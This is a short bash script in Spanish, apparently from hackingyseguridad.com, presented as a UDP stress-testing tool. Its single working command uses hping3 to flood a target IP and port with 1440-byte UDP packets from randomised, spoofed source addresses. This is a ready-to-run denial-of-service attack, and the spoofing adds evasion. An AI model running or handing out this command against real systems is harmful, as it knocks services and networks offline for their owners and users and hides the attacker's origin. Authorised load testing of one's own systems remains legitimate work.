# !/bin/bash
# Herramienta de test de stress UDP
# (C) hackingyseguridad.com 2017
# Uso: sh udpflood.sh ip_target puerto_target
echo
echo UDP Flood con herramienta hping3
echo "Uso: ./udpflood2.sh IP Puerto_UDP"
echo "Control + C para interrumpir"
echo 
hping3 $1 -2 --rand-source -p $2 --flood -d 1440
